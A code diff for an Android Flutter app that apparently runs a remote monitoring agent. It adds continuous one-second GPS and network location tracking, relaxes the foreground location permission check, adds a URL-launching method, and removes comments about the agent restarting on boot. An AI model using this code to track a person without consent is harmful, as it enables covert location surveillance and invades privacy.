@@ -217,7 +217,6 @@ class RemoteService : Service() {
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
             .setOngoing(true)
 
-        // dynamic foreground service types — only what we actually hold
         try {
             if (Build.VERSION.SDK_INT >= 34) {
                 var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
@@ -227,8 +226,8 @@ class RemoteService : Service() {
                 if (permGranted(this, Manifest.permission.RECORD_AUDIO)) {
                     types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                 }
-                if (permGranted(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) &&
-                    permGranted(this, Manifest.permission.ACCESS_FINE_LOCATION)) {
+                if (permGranted(this, Manifest.permission.ACCESS_FINE_LOCATION) ||
+                    permGranted(this, Manifest.permission.ACCESS_COARSE_LOCATION)) {
                     types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                 }
                 startForeground(9001, nb.build(), types)
@@ -627,7 +626,7 @@ class RemoteService : Service() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  BOOT / AGENT RECEIVER — watchdog rises on boot / update / alarm
+//  BOOT / AGENT RECEIVER
 // ═══════════════════════════════════════════════════════════════════════
 class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
@@ -765,10 +764,38 @@ class MainActivity : FlutterActivity() {
     private var pendingDeleteResult: MethodChannel.Result? = null
     private var player: MediaPlayer? = null
 
+    // ── LIVE location tracker ──
+    private var liveLoc: android.location.Location? = null
+    private var locListener: android.location.LocationListener? = null
+
+    private fun startLocTracker() {
+        try {
+            if (!permGranted(this, Manifest.permission.ACCESS_FINE_LOCATION) &&
+                !permGranted(this, Manifest.permission.ACCESS_COARSE_LOCATION)) return
+            if (locListener != null) return
+            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+            locListener = object : android.location.LocationListener {
+                override fun onLocationChanged(l: android.location.Location) {
+                    liveLoc = l
+                }
+                @Deprecated("deprecated")
+                override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
+                override fun onProviderEnabled(p: String) {}
+                override fun onProviderDisabled(p: String) {}
+            }
+            for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
+                try {
+                    lm.requestLocationUpdates(prov, 1000L, 1f, locListener!!)
+                } catch (_: Exception) { }
+            }
+        } catch (_: Exception) { }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
         startAgentIfReady(this)
+        startLocTracker()
     }
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
@@ -882,7 +909,28 @@ class MainActivity : FlutterActivity() {
                         if (!ok) {
                             result.success(null)
                         } else {
-                            result.success(locJson(this))
+                            startLocTracker()
+                            val l = liveLoc
+                            if (l != null) {
+                                val m = HashMap<String, Any>()
+                                m["lat"] = l.latitude
+                                m["lng"] = l.longitude
+                                m["acc"] = l.accuracy
+                                m["speed"] = l.speed
+                                m["time"] = l.time
+                                result.success(m)
+                            } else {
+                                result.success(locJson(this))
+                            }
+                        }
+                    }
+                    "openUrl" -> {
+                        try {
+                            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(call.arguments as? String ?: ""))
+                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+                            result.success(1)
+                        } catch (e: Exception) {
+                            result.success(0)
                         }
                     }
                     "agentOn" -> {
@@ -896,7 +944,6 @@ class MainActivity : FlutterActivity() {
                         if (canStartAgent(this)) {
                             startAgentIfReady(this)
                         } else {
-                            // permissions not ready yet — rise automatically in 60s
                             scheduleAgentStart(this, 60000)
                         }
                         result.success(1)
@@ -1179,6 +1226,12 @@ class MainActivity : FlutterActivity() {
     override fun onDestroy() {
         watcher?.let { contentResolver.unregisterContentObserver(it) }
         player?.release()
+        try {
+            locListener?.let {
+                (getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager)
+                    .removeUpdates(it)
+            }
+        } catch (_: Exception) { }
         super.onDestroy()
     }
 }
